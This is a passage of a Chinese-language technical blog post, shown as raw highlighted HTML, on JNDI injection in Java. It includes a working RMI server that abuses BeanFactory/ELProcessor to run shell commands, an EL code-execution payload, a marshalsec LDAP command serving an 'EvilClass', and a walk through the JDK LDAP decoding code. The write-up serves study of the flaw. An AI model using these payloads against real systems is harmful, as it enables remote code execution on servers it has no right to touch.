&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Registry&lt;/span> &lt;span style="color:#111">registry&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">LocateRegistry&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">createRegistry&lt;/span>&lt;span style="color:#f92672">(&lt;/span> &lt;span style="color:#ae81ff">6666&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 实例化Reference，指定目标类为javax.el.ELProcessor，工厂类为org.apache.naming.factory.BeanFactory
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">ResourceRef&lt;/span> &lt;span style="color:#111">ref&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ResourceRef&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;javax.el.ELProcessor&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;org.apache.naming.factory.BeanFactory&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span>&lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 强制将&amp;#39;x&amp;#39;属性的setter从&amp;#39;setX&amp;#39;变为&amp;#39;eval&amp;#39;, 详细逻辑见BeanFactory.getObjectInstance代码
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">ref&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">add&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">StringRefAddr&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;forceString&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;x=eval&amp;#34;&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 利用表达式执行命令
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">ref&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">add&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">StringRefAddr&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;x&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;\&amp;#34;\&amp;#34;.getClass().forName(\&amp;#34;javax.script.ScriptEngineManager\&amp;#34;).newInstance().getEngineByName(\&amp;#34;JavaScript\&amp;#34;).eval(\&amp;#34;new java.lang.ProcessBuilder[&amp;#39;(java.lang.String[])&amp;#39;]([&amp;#39;/bin/bash&amp;#39;, &amp;#39;-c&amp;#39;, &amp;#39;touch /tmp/mi1k7ea&amp;#39;]).start()\&amp;#34;)&amp;#34;&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;[*]Evil command: touch /tmp/mi1k7ea&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ReferenceWrapper&lt;/span> &lt;span style="color:#111">referenceWrapper&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">com&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">sun&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">jndi&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">rmi&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">registry&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">ReferenceWrapper&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">ref&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">registry&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">bind&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Object&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">referenceWrapper&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>服务端2&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">javax.el.ELProcessor&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Test&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">poc&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#39;&amp;#39;.getClass().forName(&amp;#39;javax.script.ScriptEngineManager&amp;#39;)&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;.newInstance().getEngineByName(&amp;#39;nashorn&amp;#39;)&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;.eval(\&amp;#34;s=[3];s[0]=&amp;#39;cmd&amp;#39;;s[1]=&amp;#39;/C&amp;#39;;s[2]=&amp;#39;calc&amp;#39;;java.lang.Runtime.getRuntime().exec(s);\&amp;#34;)&amp;#34;&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// String poc = &amp;#34;&amp;#39;&amp;#39;.getClass().forName(&amp;#39;java.lang.Runtime&amp;#39;).getMethod(&amp;#39;exec&amp;#39;,&amp;#39;&amp;#39;.getClass())&amp;#34; +
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// &amp;#34;.invoke(&amp;#39;&amp;#39;.getClass().forName(&amp;#39;java.lang.Runtime&amp;#39;).getMethod(&amp;#39;getRuntime&amp;#39;)&amp;#34; +
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// &amp;#34;.invoke(null),&amp;#39;calc.exe&amp;#39;)}&amp;#34;;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// String poc = &amp;#34;&amp;#39;&amp;#39;.getClass().forName(&amp;#39;javax.script.ScriptEngineManager&amp;#39;)&amp;#34; +
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// &amp;#34;.newInstance().getEngineByName(&amp;#39;JavaScript&amp;#39;)&amp;#34; +
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// &amp;#34;.eval(\&amp;#34;java.lang.Runtime.getRuntime().exec(&amp;#39;calc&amp;#39;)\&amp;#34;)&amp;#34;;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ELProcessor&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">eval&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">poc&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>客户端：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">javax.naming.Context&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">javax.naming.InitialContext&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Client&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">uri&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;rmi://localhost:6666/Object&amp;#34;&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Context&lt;/span> &lt;span style="color:#111">ctx&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InitialContext&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ctx&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">lookup&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">uri&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="ldap-1">LDAP&lt;/h2>
&lt;h3 id="低版本-1">低版本&lt;/h3>
&lt;p>我们可以通过&lt;code>LDAP&lt;/code>服务来绕过&lt;code>URLCodebase&lt;/code>实现远程加载，&lt;code>LDAP&lt;/code>服务也能返回&lt;code>JNDI Reference&lt;/code>对象，利用过程与&lt;code>jndi&lt;/code> + &lt;code>RMI Reference&lt;/code>基本一致，不同的是，&lt;code>LDAP&lt;/code>服务中&lt;code>lookup&lt;/code>方法中指定的远程地址使用的是&lt;code>LDAP&lt;/code>协议，由攻击者控制&lt;code>LDAP&lt;/code>服务端返回一个恶意&lt;code>jndi Reference&lt;/code>对象，并且&lt;code>LDAP&lt;/code>服务的&lt;code>Reference&lt;/code>远程加载&lt;code>Factory&lt;/code>类并不是使用&lt;code>RMI Class Loader&lt;/code>机制，因此不受&lt;code>trustURLCodebase&lt;/code>限制。&lt;/p>
&lt;p>可以使用&lt;code>marshalsec&lt;/code>开启&lt;code>LDAP&lt;/code>服务&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:8000/&lt;span style="color:#8045ff">\#&lt;/span>EvilClass
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>LADP&lt;/code>服务前面的调用流程和&lt;code>jndi&lt;/code>是基本一样，从&lt;code>Obj&lt;/code>类的&lt;code>decodeObject&lt;/code>方法这里就有些不太一样了，&lt;code>decodeObject&lt;/code>方法内部调用了&lt;code>decodeReference&lt;/code>方法
跟进&lt;code>com.sun.jndi.ldap.Obj.java#decodeObject&lt;/code>，按照该函数的注释来看，其主要功能是解码从&lt;code>LDAP Server&lt;/code>来的对象，该对象可能是序列化的对象，也可能是一个&lt;code>Reference&lt;/code>对象。关于序列化对象的处理，我们看后面一节。这里摘取了&lt;code>Reference&lt;/code>的处理方式：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#75af00">decodeObject&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Attributes&lt;/span> &lt;span style="color:#111">var0&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">NamingException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">var2&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">getCodebases&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">var0&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">JAVA_ATTRIBUTES&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#ae81ff">4&lt;/span>&lt;span style="color:#f92672">]));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Attribute&lt;/span> &lt;span style="color:#111">var1&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">((&lt;/span>&lt;span style="color:#111">var1&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">var0&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">JAVA_ATTRIBUTES&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#f92672">]))&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ClassLoader&lt;/span> &lt;span style="color:#111">var3&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">helper&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getURLClassLoader&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">var2&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">deserializeObject&lt;/span>&lt;span style="color:#f92672">((&lt;/span>&lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[])((&lt;/span>&lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[])&lt;/span>&lt;span style="color:#111">var1&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">()),&lt;/span> &lt;span style="color:#111">var3&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">((&lt;/span>&lt;span style="color:#111">var1&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">var0&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">JAVA_ATTRIBUTES&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#ae81ff">7&lt;/span>&lt;span style="color:#f92672">]))&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">decodeRmiObject&lt;/span>&lt;span style="color:#f92672">((&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">)&lt;/span>&lt;span style="color:#111">var0&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">JAVA_ATTRIBUTES&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#f92672">]).&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(),&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">)&lt;/span>&lt;span style="color:#111">var1&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(),&lt;/span> &lt;span style="color:#111">var2&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">var1&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">var0&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">JAVA_ATTRIBUTES&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">]);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">//调用了decodeReference方法
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">var1&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span> &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#111">var1&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">contains&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">JAVA_OBJECT_CLASSES&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#f92672">])&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#111">var1&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">contains&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">JAVA_OBJECT_CLASSES_LOWER&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#f92672">])&lt;/span> &lt;span style="color:#f92672">?&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span> &lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">decodeReference&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">var0&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">var2&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">IOException&lt;/span> &lt;span style="color:#111">var5&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">NamingException&lt;/span> &lt;span style="color:#111">var4&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">NamingException&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">var4&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setRootCause&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">var5&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#111">var4&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>Obj&lt;/code>类的&lt;code>decodeReference&lt;/code>方法根据&lt;code>Ldap&lt;/code>传入的&lt;code>addAttribute&lt;/code>属性构造并返回了一个新的&lt;code>reference&lt;/code>对象引用&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#111">Reference&lt;/span> &lt;span style="color:#75af00">decodeReference&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Attributes&lt;/span> &lt;span style="color:#111">var0&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">var1&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">NamingException&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">IOException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">var4&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Attribute&lt;/span> &lt;span style="color:#111">var2&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">((&lt;/span>&lt;span style="color:#111">var2&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">var0&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">JAVA_ATTRIBUTES&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#f92672">]))&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InvalidAttributesException&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">JAVA_ATTRIBUTES&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34; attribute is required&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">var3&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">)&lt;/span>&lt;span style="color:#111">var2&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
